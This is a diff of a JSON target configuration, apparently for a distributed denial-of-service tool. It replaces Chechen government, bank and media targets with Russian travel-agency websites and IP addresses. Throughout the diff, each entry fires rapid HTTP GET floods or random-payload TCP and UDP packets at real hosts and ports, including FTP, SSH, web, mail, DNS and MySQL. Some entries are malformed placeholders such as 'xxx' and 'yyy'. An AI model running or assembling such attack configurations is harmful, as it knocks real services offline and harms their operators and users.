@@ -6,186 +6,141 @@
         "request": {
           "method": "GET",
           "count": 10,
-          "path": "http://www.icentr.ru"
+          "path": "https://turskidki.ru/"
         },
         "interval_ms": 1
       }
     },
     {
       "type": "http",
-      "count": 10,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://www.icentr.ru"
-        }
+          "count": 10,
+          "path": "http://turskidki.ru/"
+        },
+        "interval_ms": 1
+      }
+    },
+    {
+      "type": "tcp",
+      "count": 10,
+      "args": {
+        "address": "193.164.150.212:443",
+        "body": "{{ random_payload 100 }}"
       }
     },
     {
       "type": "http",
-      "count": 10,
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://rsbis.ru/elektronnaya-podpis"
-        }
+          "count": 10,
+          "path": "https://anex-tour.ru/"
+        },
+        "interval_ms": 1
       }
     },
     {
       "type": "http",
-      "count": 10,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://rsbis.ru/elektronnaya-podpis"
-        }
+          "count": 10,
+          "path": "http://anex-tour.ru/"
+        },
+        "interval_ms": 1
+      }
+    },
+    {
+      "type": "tcp",
+      "count": 10,
+      "args": {
+        "address": "95.214.60.149:21",
+        "body": "{{ random_payload 100 }}"
+      }
+    },
+    {
+      "type": "tcp",
+      "count": 10,
+      "args": {
+        "address": "95.214.60.149:22",
+        "body": "{{ random_payload 100 }}"
+      }
+    },
+    {
+      "type": "tcp",
+      "count": 10,
+      "args": {
+        "address": "95.214.60.149:80",
+        "body": "{{ random_payload 100 }}"
+      }
+    },
+    {
+      "type": "tcp",
+      "count": 10,
+      "args": {
+        "address": "95.214.60.149:443",
+        "body": "{{ random_payload 100 }}"
       }
     },
     {
       "type": "http",
-      "count": 10,
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://www.stv-it.ru"
-        }
+          "count": 10,
+          "path": "https://www.bankturov.ru/"
+        },
+        "interval_ms": 1
       }
     },
     {
       "type": "http",
-      "count": 10,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://www.stv-it.ru"
-        }
+          "count": 10,
+          "path": "http://www.bankturov.ru/"
+        },
+        "interval_ms": 1
+      }
+    },
+    {
+      "type": "tcp",
+      "count": 10,
+      "args": {
+        "address": "94.26.241.164:443",
+        "body": "{{ random_payload 100 }}"
       }
     },
     {
       "type": "http",
-      "count": 10,
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://www.kt-69.ru"
-        }
+          "count": 10,
+          "path": "https://www.1001tur.ru/"
+        },
+        "interval_ms": 1
       }
     },
     {
       "type": "http",
-      "count": 10,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://www.kt-69.ru"
-        }
-      }
-    },
-    {
-      "type": "http",
-      "count": 10,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://www.24ecp.ru"
-        }
-      }
-    },
-    {
-      "type": "http",
-      "count": 10,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://www.24ecp.ru"
-        }
-      }
-    },
-    {
-      "type": "http",
-      "count": 10,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://kraskript.com"
-        }
-      }
-    },
-    {
-      "type": "http",
-      "count": 10,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://kraskript.com"
-        }
-      }
-    },
-    {
-      "type": "http",
-      "count": 10,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://www.y-center.ru"
-        }
-      }
-    },
-    {
-      "type": "http",
-      "count": 10,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://www.y-center.ru"
-        }
-      }
-    },
-    {
-      "type": "http",
-      "count": 10,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://www.rcarus.ru"
-        }
-      }
-    },
-    {
-      "type": "http",
-      "count": 10,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://www.rcarus.ru"
-        }
-      }
-    },
-    {
-      "type": "http",
-      "count": 10,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://ca.gisca.ru"
-        }
-      }
-    },
-    {
-      "type": "http",
-      "count": 10,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://ca.gisca.ru"
-        }
+          "count": 10,
+          "path": "http://www.1001tur.ru/"
+        },
+        "interval_ms": 1
       }
     },
     {
       "type": "tcp",
       "count": 10,
       "args": {
-        "address": "185.26.122.69:21",
+        "address": "89.208.35.174:22",
         "body": "{{ random_payload 100 }}"
       }
     },
@@ -193,7 +148,7 @@
       "type": "tcp",
       "count": 10,
       "args": {
-        "address": "185.26.122.69:80",
+        "address": "89.208.35.174:80",
         "body": "{{ random_payload 100 }}"
       }
     },
@@ -201,399 +156,7 @@
       "type": "tcp",
       "count": 10,
       "args": {
-        "address": "185.26.122.69:443",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "185.26.122.69:2222",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "185.26.122.69:3306",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "185.26.122.69:8080",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "89.239.185.186:80",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "89.239.185.186:443",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "217.107.219.57:21",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "217.107.219.57:22",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "217.107.219.57:80",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "217.107.219.57:443",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "217.107.219.57:2222",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "217.107.219.57:3306",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "217.107.219.57:8080",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "45.130.41.31:21",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "45.130.41.31:22",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "45.130.41.31:80",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "45.130.41.31:443",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "45.130.41.31:3306",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "95.172.129.51:53",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "95.172.129.51:80",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "95.172.129.51:443",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "80.255.150.171:22",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "80.255.150.171:80",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "80.255.150.171:443",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "80.255.150.171:8080",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "95.172.129.51:53",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "95.172.129.51:80",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "95.172.129.51:443",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "89.237.29.234:80",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "89.237.29.234:443",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "89.237.29.234:2000",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "89.237.29.235:80",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "89.237.29.235:443",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "89.237.29.235:2000",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "89.237.29.235:3000",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "89.237.29.235:3001",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "89.237.29.235:yyy",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "89.237.29.238:22",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "89.237.29.238:25",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "89.237.29.238:110",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "89.237.29.238:143",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "89.237.29.238:587",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "89.237.29.238:993",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "89.237.29.238:2000",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "185.101.204.52:80",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "95.161.154.197:80",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "95.161.154.197:443",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "213.189.196.127:53",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "213.189.196.127:80",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "213.189.196.127:443",
+        "address": "89.208.35.174:443",
         "body": "{{ random_payload 100 }}"
       }
     },
@@ -601,7 +164,7 @@
       "type": "udp",
       "count": 10,
       "args": {
-        "address": "213.189.196.127:53",
+        "address": "89.208.35.174:53",
         "body": "{{ random_payload 100 }}"
       }
     },
@@ -609,39 +172,7 @@
       "type": "udp",
       "count": 10,
       "args": {
-        "address": "213.189.196.127:123",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "31.31.196.207:21",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "31.31.196.207:22",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "31.31.196.207:25",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "31.31.196.207:53",
+        "address": "89.208.35.174:123",
         "body": "{{ random_payload 100 }}"
       }
     },
@@ -649,439 +180,7 @@
       "type": "udp",
       "count": 10,
       "args": {
-        "address": "31.31.196.207:53",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "31.31.196.207:80",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "31.31.196.207:110",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "31.31.196.207:143",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "31.31.196.207:443",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "xxx:465",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "31.31.196.207:yyy",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "udp",
-      "count": 10,
-      "args": {
-        "address": "31.31.196.207:111",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "31.31.196.24:21",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "31.31.196.24:22",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "31.31.196.24:25",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "31.31.196.24:53",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "udp",
-      "count": 10,
-      "args": {
-        "address": "31.31.196.24:53",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "31.31.196.24:80",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "31.31.196.24:110",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "31.31.196.24:143",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "31.31.196.24:443",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "31.31.196.24:465",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "udp",
-      "count": 10,
-      "args": {
-        "address": "31.31.196.24:111",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "87.236.16.168:22",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "87.236.16.168:80",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "87.236.16.168:443",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "31.31.198.175 :21",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "31.31.198.175 :22",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "31.31.198.175 :25",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "31.31.198.175 :53",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "udp",
-      "count": 10,
-      "args": {
-        "address": "31.31.198.175 :53",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "31.31.198.175 :80",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "31.31.198.175 :110",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "31.31.198.175 :143",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "31.31.198.175 :443",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "31.31.198.175 :465",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "udp",
-      "count": 10,
-      "args": {
-        "address": "31.31.198.175 :111",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "xxx:21",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "91.106.207.34:yyy",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "91.106.207.34:22",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "91.106.207.34:80",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "91.106.207.34:3306",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "79.174.66.135:21",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "79.174.66.135:22",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "79.174.66.135:25",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "79.174.66.135:80",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "79.174.66.135:110",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "79.174.66.135:143",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "79.174.66.135:443",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "79.174.66.135:3306",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "91.215.221.46:21",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "91.215.221.46:25",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "91.215.221.46:110",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "91.215.221.46:143",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "91.215.221.46:465",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "91.215.221.46:993",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "tcp",
-      "count": 10,
-      "args": {
-        "address": "91.215.221.46:995",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "udp",
-      "count": 10,
-      "args": {
-        "address": "91.215.221.46:53",
-        "body": "{{ random_payload 100 }}"
-      }
-    },
-    {
-      "type": "udp",
-      "count": 10,
-      "args": {
-        "address": "91.215.221.46:123",
+        "address": "89.208.35.174:500",
         "body": "{{ random_payload 100 }}"
       }
     },
@@ -1091,7 +190,7 @@
         "request": {
           "method": "GET",
           "count": 10,
-          "path": "http://www.chechnya.online/ru/"
+          "path": "https://tours.tutu.ru/"
         },
         "interval_ms": 1
       }
@@ -1102,7 +201,34 @@
         "request": {
           "method": "GET",
           "count": 10,
-          "path": "https://www.chechnya.online/ru/"
+          "path": "http://tours.tutu.ru/"
+        },
+        "interval_ms": 1
+      }
+    },
+    {
+      "type": "tcp",
+      "count": 10,
+      "args": {
+        "address": "178.248.236.15:80",
+        "body": "{{ random_payload 100 }}"
+      }
+    },
+    {
+      "type": "tcp",
+      "count": 10,
+      "args": {
+        "address": "178.248.236.15:443",
+        "body": "{{ random_payload 100 }}"
+      }
+    },
+    {
+      "type": "http",
+      "args": {
+        "request": {
+          "method": "GET",
+          "count": 10,
+          "path": "https://travelata.ru/ "
         },
         "interval_ms": 1
       }
@@ -1113,163 +239,25 @@
         "request": {
           "method": "GET",
           "count": 10,
-          "path": "http://vaynahavia.com/"
+          "path": "http://travelata.ru/"
         },
         "interval_ms": 1
       }
     },
     {
-      "type": "http",
+      "type": "tcp",
+      "count": 10,
       "args": {
-        "request": {
-          "method": "GET",
-          "count": 10,
-          "path": "https://vaynahavia.com/"
-        },
-        "interval_ms": 1
+        "address": "178.248.232.202:80",
+        "body": "{{ random_payload 100 }}"
       }
     },
     {
-      "type": "http",
+      "type": "tcp",
+      "count": 10,
       "args": {
-        "request": {
-          "method": "GET",
-          "count": 10,
-          "path": "https://grozmer.ru/"
-        },
-        "interval_ms": 1
-      }
-    },
-    {
-      "type": "http",
-      "args": {
-        "request": {
-          "method": "GET",
-          "count": 10,
-          "path": "http://grozmer.ru/"
-        },
-        "interval_ms": 1
-      }
-    },
-    {
-      "type": "http",
-      "args": {
-        "request": {
-          "method": "GET",
-          "count": 10,
-          "path": "https://gudermes.net/"
-        },
-        "interval_ms": 1
-      }
-    },
-    {
-      "type": "http",
-      "args": {
-        "request": {
-          "method": "GET",
-          "count": 10,
-          "path": "http://gudermes.net/"
-        },
-        "interval_ms": 1
-      }
-    },
-    {
-      "type": "http",
-      "args": {
-        "request": {
-          "method": "GET",
-          "count": 10,
-          "path": "http://www.meriya-urus-martana.ru/"
-        },
-        "interval_ms": 1
-      }
-    },
-    {
-      "type": "http",
-      "args": {
-        "request": {
-          "method": "GET",
-          "count": 10,
-          "path": "https://www.meriya-urus-martana.ru/"
-        },
-        "interval_ms": 1
-      }
-    },
-    {
-      "type": "http",
-      "args": {
-        "request": {
-          "method": "GET",
-          "count": 10,
-          "path": "http://vesti95.ru"
-        },
-        "interval_ms": 1
-      }
-    },
-    {
-      "type": "http",
-      "args": {
-        "request": {
-          "method": "GET",
-          "count": 10,
-          "path": "https://vesti95.ru"
-        },
-        "interval_ms": 1
-      }
-    },
-    {
-      "type": "http",
-      "args": {
-        "request": {
-          "method": "GET",
-          "count": 10,
-          "path": "https://www.minfinchr.ru/"
-        },
-        "interval_ms": 1
-      }
-    },
-    {
-      "type": "http",
-      "args": {
-        "request": {
-          "method": "GET",
-          "count": 10,
-          "path": "https://www.icentr.ru"
-        },
-        "interval_ms": 1
-      }
-    },
-    {
-      "type": "http",
-      "args": {
-        "request": {
-          "method": "GET",
-          "count": 10,
-          "path": "https://www.minfinchr.ru/"
-        },
-        "interval_ms": 1
-      }
-    },
-    {
-      "type": "http",
-      "args": {
-        "request": {
-          "method": "GET",
-          "count": 10,
-          "path": "http://pgu.gov-chr.ru/"
-        },
-        "interval_ms": 1
-      }
-    },
-    {
-      "type": "http",
-      "args": {
-        "request": {
-          "method": "GET",
-          "count": 10,
-          "path": "https://pgu.gov-chr.ru/"
-        },
-        "interval_ms": 1
+        "address": "178.248.232.202:443",
+        "body": "{{ random_payload 100 }}"
       }
     }
   ]
